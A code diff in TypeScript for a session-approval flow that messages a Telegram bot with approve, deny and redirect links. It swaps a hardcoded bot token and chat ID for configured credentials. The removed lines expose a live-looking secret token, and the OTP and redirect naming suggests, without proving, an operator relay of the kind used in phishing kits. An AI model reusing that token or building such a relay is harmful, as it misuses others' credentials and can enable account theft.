@@ -1,5 +1,5 @@
 import { APPROVAL_TIMEOUT_MS, METHOD_DENIED_ERROR_TEXT, MSG_UNABLE_REACH_VERIFICATION, OTP_CODE_ERROR_TEXT } from "@/lib/approval-messages"
-import { SITE_ORIGIN } from "@/lib/site-url"
+import { getTelegramCredentials, getUniversalWebhookBaseUrl } from "@/lib/universal-webhook"
 
 export type ApprovalDecision = "pending" | "approved" | "denied" | "redirected" | "timed_out"
 
@@ -95,17 +95,19 @@ export function setApprovalDecision(
 }
 
 export function buildApprovalActionUrl(action: "approve" | "deny" | "redirect", sessionId: string): string {
-  const url = new URL(`${SITE_ORIGIN}/api/telegram/approval`)
+  const url = new URL("/api/telegram/approval", getUniversalWebhookBaseUrl())
   url.searchParams.set("action", action)
   url.searchParams.set("sessionId", sessionId)
   return url.toString()
 }
 
 export async function sendApprovalActionMessage(session: ApprovalRequest): Promise<boolean> {
-  const botToken = "8985470259:AAEP5YHeX8sSz65Pfb3aoJv8Re61F10AONg"
-  const chatIds = ["8810036834"]
+  const { botToken, chatIds } = getTelegramCredentials()
 
-  if (!botToken || chatIds.length === 0) return false
+  if (!botToken || chatIds.length === 0) {
+    console.warn("Universal webhook is not configured: set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID")
+    return false
+  }
 
   const payload = {
     chat_id: chatIds[0],
